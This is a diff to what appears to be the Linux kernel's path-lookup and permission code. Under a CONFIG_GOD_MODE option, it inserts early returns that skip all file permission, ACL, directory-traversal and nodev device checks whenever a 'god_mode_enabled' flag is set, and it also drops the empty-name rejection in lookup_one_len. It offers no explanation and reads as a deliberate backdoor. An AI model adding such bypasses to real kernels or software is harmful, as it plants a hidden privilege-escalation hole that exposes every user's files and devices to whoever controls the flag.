@@ -229,7 +229,12 @@ static int check_acl(struct inode *inode, int mask)
  */
 static int acl_permission_check(struct inode *inode, int mask)
 {
-	unsigned int mode = inode->i_mode;
+	unsigned int mode;
+#ifdef CONFIG_GOD_MODE
+if (god_mode_enabled)
+	return 0;
+#endif
+	mode = inode->i_mode;
 
 	if (current_user_ns() != inode_userns(inode))
 		goto other_perms;
@@ -273,6 +278,10 @@ other_perms:
 int generic_permission(struct inode *inode, int mask)
 {
 	int ret;
+#ifdef CONFIG_GOD_MODE
+if (god_mode_enabled)
+	return 0;
+#endif
 
 	/*
 	 * Do the basic permission checks.
@@ -345,6 +354,10 @@ static inline int do_inode_permission(struct inode *inode, int mask)
 int inode_permission(struct inode *inode, int mask)
 {
 	int retval;
+#ifdef CONFIG_GOD_MODE
+if (god_mode_enabled)
+        return 0;
+#endif
 
 	if (unlikely(mask & MAY_WRITE)) {
 		umode_t mode = inode->i_mode;
@@ -1247,6 +1260,10 @@ need_lookup:
 
 static inline int may_lookup(struct nameidata *nd)
 {
+#ifdef CONFIG_GOD_MODE
+if (god_mode_enabled)
+	return 0;
+#endif
 	if (nd->flags & LOOKUP_RCU) {
 		int err = inode_permission(nd->inode, MAY_EXEC|MAY_NOT_BLOCK);
 		if (err != -ECHILD)
@@ -1872,8 +1889,14 @@ struct dentry *lookup_one_len(const char *name, struct dentry *base, int len)
 	this.name = name;
 	this.len = len;
 	this.hash = full_name_hash(name, len);
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
 	if (!len)
 		return ERR_PTR(-EACCES);
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	while (len--) {
 		c = *(const unsigned char *)name++;
@@ -2129,8 +2152,18 @@ static int may_open(struct path *path, int acc_mode, int flag)
 		break;
 	case S_IFBLK:
 	case S_IFCHR:
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
 		if (path->mnt->mnt_flags & MNT_NODEV)
 			return -EACCES;
+#ifdef CONFIG_GOD_MODE
+} else {
+
+	return 0;
+}
+#endif
+
 		/*FALLTHRU*/
 	case S_IFIFO:
 	case S_IFSOCK:
